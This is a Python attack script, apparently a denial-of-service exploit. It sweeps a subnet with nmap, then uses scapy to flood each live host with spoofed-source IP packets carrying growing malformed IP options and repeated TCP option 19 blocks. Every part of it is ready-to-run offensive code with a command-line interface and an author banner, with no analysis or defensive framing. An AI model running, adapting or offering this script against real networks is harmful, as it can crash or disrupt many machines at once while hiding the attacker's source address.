import time
import nmap
import argparse
import struct
from scapy.all import *

def banner () : 
 return '''
|"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""|"| 
|CODED BY > R3DXPLOIT(JIMMY)                                          | |
|EMAIL > RETURN_ROOT@PROTONMAIL.COM                                   | |
|WEB-PAGE > https://r3dxpl0it.Github.io                               |_|
|_____________________________________________________________________|/|
'''

def Launch(src, subnet , Payload_last):
    print('Launching Nmap Port Scanner')
    nm = nmap.PortScanner()
    nm.scan(hosts=subnet, arguments='-sP')
    iplist = nm.all_hosts()
    iplist = sorted(iplist, key=lambda ip: struct.unpack("!L", inet_aton(ip))[0])
    print('Found Hosts : ' , iplist)
    payload = ""
    for _ in range(Payload_last):
        payload+="x"
        for host in iplist:
            print('Attacking : ' , host , '[Payload' , payload , ']')
            send(IP(src=src, dst=host, options=payload)/TCP(options=[(19,"x"*18),(19,"x"*18)]), verbose=False)
            time.sleep(0.1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(dest='target' , help='Target Ip or Network Ip Range ')
    parser.add_argument('-s', '--sourceip', help='Source Ip Adress', dest='ip')
    parser.add_argument('-p', '--payload', help='Number of Payload Loop', dest='playload' , default = 20 , type = int)

    args = parser.parse_args()
    if args.target is not None :
        if args.ip is None :
            print(banner())
            args.ip = '10.10.10.10'
        Launch(src=args.ip, subnet=args.target , Payload_last = args.playload)
    else : 
        print(banner())
        print('\nTarget is Missing , Specify Target/Target-Range-Ip with "-t"\n')
